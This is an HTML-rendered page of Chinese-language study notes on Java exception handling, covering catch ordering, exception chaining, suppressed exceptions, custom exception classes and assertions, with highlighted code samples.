&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;END&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>可以一个try对多个catch，此时注意catch的顺序：子类在前，避免短路&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process3&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IO error&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 永远捕获不到 会被上面的截胡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bad encoding&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="抛出异常">抛出异常&lt;/h3>
&lt;ul>
&lt;li>分两步：创建某个&lt;code>Exception&lt;/code>的实例 -&amp;gt; 抛出&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果一个方法捕获了某个异常后，又在&lt;code>catch&lt;/code>子句中抛出新的异常，就相当于把抛出的异常类型“转换”了；注意为了能追踪到完整的异常栈，在构造异常的时候，把原始的&lt;code>Exception&lt;/code>实例传进去&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 01
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 05
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process1&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 02
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NullPointerException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// throw new IllegalArgumentException();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 04
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 03
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果用注释掉的方式写就会丢失&lt;code>NullPointerException&lt;/code>这一条&lt;/p>
&lt;ul>
&lt;li>在代码中获取原始异常可以使用&lt;code>Throwable.getCause()&lt;/code>方法。如果返回&lt;code>null&lt;/code>，说明已经是“根异常”了(Caused by: xxxx)&lt;/li>
&lt;li>如果在finally中抛出异常（尽量别），由于&lt;code>catch&lt;/code>中准备抛出的异常就“消失”了，所以这个没有被抛出的异常称为“被屏蔽”的异常Suppressed Exception&lt;/li>
&lt;li>如果我们需要获知所有的异常，可以先用&lt;code>origin&lt;/code>变量保存原始异常，然后调用&lt;code>Throwable.addSuppressed()&lt;/code>，把原始异常添加进来，最后在&lt;code>finally&lt;/code>抛出&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parseInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;abc&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addSuppressed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当&lt;code>catch&lt;/code>和&lt;code>finally&lt;/code>都抛出了异常时，虽然&lt;code>catch&lt;/code>的异常被屏蔽了，但是，&lt;code>finally&lt;/code>抛出的异常仍然包含了它：&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;main&amp;#34; java.lang.IllegalArgumentException
at Main.main(Main.java:11)
Suppressed: java.lang.NumberFormatException: For input string: &amp;#34;abc&amp;#34;
at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
at java.base/java.lang.Integer.parseInt(Integer.java:652)
at java.base/java.lang.Integer.parseInt(Integer.java:770)
at Main.main(Main.java:6)
&lt;/code>&lt;/pre>&lt;p>通过&lt;code>Throwable.getSuppressed()&lt;/code>可以获取所有的&lt;code>Suppressed Exception&lt;/code>&lt;/p>
&lt;h3 id="自定义异常">自定义异常&lt;/h3>
&lt;ul>
&lt;li>见的做法是自定义一个&lt;code>BaseException&lt;/code>作为“根异常”，然后，派生出各种业务类型的异常；&lt;code>BaseException&lt;/code>需要从一个适合的&lt;code>Exception&lt;/code>派生，通常建议从&lt;code>RuntimeException&lt;/code>派生&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">UserNotFoundException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">LoginFailedException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>自定义的&lt;code>BaseException&lt;/code>应该提供多个构造方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样，抛出异常的时候，就可以选择合适的构造方法&lt;/p>
&lt;h3 id="断言">断言&lt;/h3>
&lt;ul>
&lt;li>JVM默认关闭断言指令，需传入&lt;code>-enableassertions&lt;/code>或&lt;code>-ea&lt;/code>；还可以有选择地对特定地类启用断言，命令行参数是：&lt;code>-ea:com.itranswarp.sample.Main&lt;/code>，表示只对&lt;code>com.itranswarp.sample.Main&lt;/code>这个类启用断言；或者对特定地包启用断言，命令行参数是：&lt;code>-ea:com.itranswarp.sample...&lt;/code>（注意结尾有3个&lt;code>.&lt;/code>），表示对&lt;code>com.itranswarp.sample&lt;/code>这个包启动断言&lt;/li>
&lt;li>是一种调试方式，失败时会抛出&lt;code>AssertionError&lt;/code>，导致程序结束退出&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">abs&lt;/span>&lt;span style="color:#f92672">(-&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">45&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;x must &amp;gt;= 0&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 会带上消息
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>不能用于可恢复的程序错误，只应该用于开发和测试阶段，对于可恢复的程序错误，不应该使用断言&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>应该直接捕获了&lt;/p>
